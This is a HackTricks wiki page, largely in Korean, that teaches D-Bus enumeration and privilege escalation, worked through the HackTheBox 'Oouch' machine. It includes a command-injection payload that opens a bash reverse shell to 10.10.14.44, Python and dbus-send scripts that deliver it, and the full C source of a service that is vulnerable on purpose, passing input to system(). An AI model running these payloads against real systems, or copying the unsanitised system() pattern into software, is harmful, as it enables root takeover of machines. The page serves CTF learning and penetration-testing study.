# D-Bus Enumeration & Command Injection Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **GUI enumeration**

D-Bus는 Ubuntu 데스크탑 환경에서 프로세스 간 통신(IPC) 매개체로 사용됩니다. Ubuntu에서는 여러 메시지 버스의 동시 작동이 관찰됩니다: 시스템 버스는 주로 **특권 서비스가 시스템 전반에 관련된 서비스를 노출하는 데 사용되며**, 각 로그인한 사용자에 대한 세션 버스는 해당 특정 사용자에게만 관련된 서비스를 노출합니다. 여기서는 권한 상승을 목표로 하기 때문에 더 높은 권한(예: root)에서 실행되는 서비스와의 연관성으로 인해 시스템 버스에 주로 초점을 맞춥니다. D-Bus의 아키텍처는 각 세션 버스에 대해 '라우터'를 사용하여 클라이언트가 통신하고자 하는 서비스에 대해 지정한 주소에 따라 클라이언트 메시지를 적절한 서비스로 리디렉션하는 역할을 합니다.

D-Bus의 서비스는 **객체**와 **인터페이스**로 정의됩니다. 객체는 표준 OOP 언어의 클래스 인스턴스에 비유할 수 있으며, 각 인스턴스는 **객체 경로**로 고유하게 식별됩니다. 이 경로는 파일 시스템 경로와 유사하게 서비스가 노출하는 각 객체를 고유하게 식별합니다. 연구 목적을 위한 주요 인터페이스는 **org.freedesktop.DBus.Introspectable** 인터페이스로, 단일 메서드인 Introspect를 특징으로 합니다. 이 메서드는 객체가 지원하는 메서드, 신호 및 속성의 XML 표현을 반환하며, 여기서는 속성과 신호를 생략하고 메서드에 초점을 맞춥니다.

D-Bus 인터페이스와의 통신을 위해 두 가지 도구가 사용되었습니다: D-Bus에서 노출된 메서드를 스크립트에서 쉽게 호출할 수 있는 CLI 도구인 **gdbus**와 각 버스에서 사용 가능한 서비스를 열거하고 각 서비스에 포함된 객체를 표시하도록 설계된 Python 기반 GUI 도구인 [**D-Feet**](https://wiki.gnome.org/Apps/DFeet)입니다.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


첫 번째 이미지에서는 D-Bus 시스템 버스에 등록된 서비스가 표시되며, **org.debin.apt**가 시스템 버스 버튼을 선택한 후 특별히 강조됩니다. D-Feet는 이 서비스에 대해 객체를 쿼리하여 선택한 객체에 대한 인터페이스, 메서드, 속성 및 신호를 두 번째 이미지에 표시합니다. 각 메서드의 시그니처도 자세히 설명되어 있습니다.

주목할 만한 기능은 서비스의 **프로세스 ID (pid)**와 **명령줄**을 표시하는 것으로, 서비스가 상승된 권한으로 실행되는지 확인하는 데 유용하며, 연구의 관련성에 중요합니다.

**D-Feet는 메서드 호출도 허용합니다**: 사용자는 매개변수로 Python 표현식을 입력할 수 있으며, D-Feet는 이를 D-Bus 유형으로 변환한 후 서비스를 호출합니다.

그러나 **일부 메서드는 인증이 필요**하다는 점에 유의해야 합니다. 우리는 자격 증명 없이 권한을 상승시키는 것이 목표이므로 이러한 메서드는 무시할 것입니다.

또한 일부 서비스는 사용자가 특정 작업을 수행할 수 있는지 여부를 확인하기 위해 org.freedeskto.PolicyKit1이라는 다른 D-Bus 서비스에 쿼리합니다.

## **Cmd line Enumeration**

### 서비스 객체 나열

열린 D-Bus 인터페이스를 나열하는 것이 가능합니다:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) 프로세스가 버스에 대한 연결을 설정하면, 버스는 해당 연결에 _고유 연결 이름_이라는 특별한 버스 이름을 할당합니다. 이러한 유형의 버스 이름은 불변이며—연결이 존재하는 한 변경되지 않을 것이 보장됩니다—더욱 중요한 것은, 버스 수명 동안 재사용될 수 없다는 것입니다. 이는 해당 버스에 대한 다른 연결이 그러한 고유 연결 이름을 할당받지 않음을 의미하며, 동일한 프로세스가 버스에 대한 연결을 종료하고 새 연결을 생성하더라도 마찬가지입니다. 고유 연결 이름은 일반적으로 금지된 콜론 문자로 시작하기 때문에 쉽게 인식할 수 있습니다.

### Service Object Info

그런 다음, 다음을 사용하여 인터페이스에 대한 정보를 얻을 수 있습니다:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### List Interfaces of a Service Object

권한이 충분해야 합니다.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### 서비스 객체의 인터페이스 조사

이 예제에서는 `tree` 매개변수를 사용하여 발견된 최신 인터페이스가 선택되었음을 주목하십시오 (_이전 섹션 참조_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Note the method `.Block` of the interface `htb.oouch.Block` (the one we are interested in). The "s" of the other columns may mean that it's expecting a string.

### Monitor/Capture Interface

충분한 권한이 있으면 (단순히 `send_destination` 및 `receive_sender` 권한만으로는 부족함) **D-Bus 통신을 모니터링**할 수 있습니다.

**통신을 모니터링**하려면 **root**여야 합니다. 여전히 root로 문제를 겪고 있다면 [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) 및 [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)를 확인하세요.

{% hint style="warning" %}
D-Bus 구성 파일을 **비루트 사용자가** 통신을 스니핑할 수 있도록 **구성하는 방법**을 알고 있다면 **연락주세요**!
{% endhint %}

Different ways to monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
다음 예제에서 인터페이스 `htb.oouch.Block`이 모니터링되고 **잘못된 통신을 통해 "**_**lalalalal**_**" 메시지가 전송됩니다**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
`capture` 대신 `monitor`를 사용하여 결과를 pcap 파일에 저장할 수 있습니다.

#### 모든 잡음 필터링하기 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

버스에 정보가 너무 많으면 다음과 같이 일치 규칙을 전달하세요:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
여러 규칙을 지정할 수 있습니다. 메시지가 _어떤_ 규칙과 일치하면 메시지가 출력됩니다. 다음과 같이:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
D-Bus 문법 규칙에 대한 자세한 내용은 [D-Bus 문서](http://dbus.freedesktop.org/doc/dbus-specification.html)를 참조하세요.

### 더 많은 정보

`busctl`에는 더 많은 옵션이 있으며, [**여기에서 모두 찾아보세요**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **취약한 시나리오**

사용자 **qtc가 HTB의 호스트 "oouch" 내에서** _/etc/dbus-1/system.d/htb.oouch.Block.conf_에 위치한 **예상치 못한 D-Bus 구성 파일**을 찾을 수 있습니다.
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Note from the previous configuration that **you will need to be the user `root` or `www-data` to send and receive information** via this D-BUS communication.

As user **qtc** inside the docker container **aeb4525789d8** you can find some dbus related code in the file _/code/oouch/routes.py._ This is the interesting code:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
As you can see, it is **D-Bus 인터페이스에 연결하고** **"Block" 함수**에 "client\_ip"를 전송하고 있습니다.

D-Bus 연결의 다른 쪽에는 C로 컴파일된 바이너리가 실행되고 있습니다. 이 코드는 **D-Bus 연결에서 IP 주소를 수신 대기하고 있으며 `system` 함수를 통해 iptables를 호출하여 주어진 IP 주소를 차단합니다.**\
**`system` 호출은 의도적으로 명령 주입에 취약하므로, 다음과 같은 페이로드는 리버스 셸을 생성합니다: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`**

### Exploit it

이 페이지의 끝에서 **D-Bus 애플리케이션의 전체 C 코드**를 찾을 수 있습니다. 그 안에서 91-97행 사이에 **`D-Bus 객체 경로`** **및 `인터페이스 이름`**이 **등록되는 방법**을 찾을 수 있습니다. 이 정보는 D-Bus 연결에 정보를 전송하는 데 필요합니다:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
또한, 57번째 줄에서 **이 D-Bus 통신에 등록된 유일한 메서드**가 `Block`이라고 되어 있습니다(_**그래서 다음 섹션에서는 페이로드가 서비스 객체 `htb.oouch.Block`, 인터페이스 `/htb/oouch/Block` 및 메서드 이름 `Block`으로 전송될 것입니다**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

다음 파이썬 코드는 `block_iface.Block(runme)`를 통해 D-Bus 연결에 페이로드를 전송합니다 (_이 코드는 이전 코드 조각에서 추출되었습니다_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl 및 dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send`는 "Message Bus"에 메시지를 보내는 데 사용되는 도구입니다.
* Message Bus – 시스템이 애플리케이션 간의 통신을 쉽게 하기 위해 사용하는 소프트웨어입니다. 메시지 큐와 관련이 있지만(메시지가 순서대로 정렬됨) Message Bus에서는 메시지가 구독 모델로 전송되며 매우 빠릅니다.
* “-system” 태그는 세션 메시지가 아닌 시스템 메시지를 언급하는 데 사용됩니다(기본값).
* “–print-reply” 태그는 우리의 메시지를 적절하게 인쇄하고 인간이 읽을 수 있는 형식으로 응답을 받는 데 사용됩니다.
* “–dest=Dbus-Interface-Block” Dbus 인터페이스의 주소입니다.
* “–string:” – 인터페이스에 보내고자 하는 메시지의 유형입니다. 메시지를 보내는 여러 형식이 있으며, double, bytes, booleans, int, objpath 등이 있습니다. 이 중 "object path"는 Dbus 인터페이스에 파일의 경로를 보내고자 할 때 유용합니다. 이 경우 특별한 파일(FIFO)을 사용하여 파일 이름으로 인터페이스에 명령을 전달할 수 있습니다. “string:;” – 이는 FIFO 리버스 셸 파일/명령의 위치를 다시 호출하기 위한 것입니다.

_`htb.oouch.Block.Block`에서 첫 번째 부분(`htb.oouch.Block`)은 서비스 객체를 참조하고 마지막 부분(`.Block`)은 메서드 이름을 참조합니다._

### C code

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## References
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
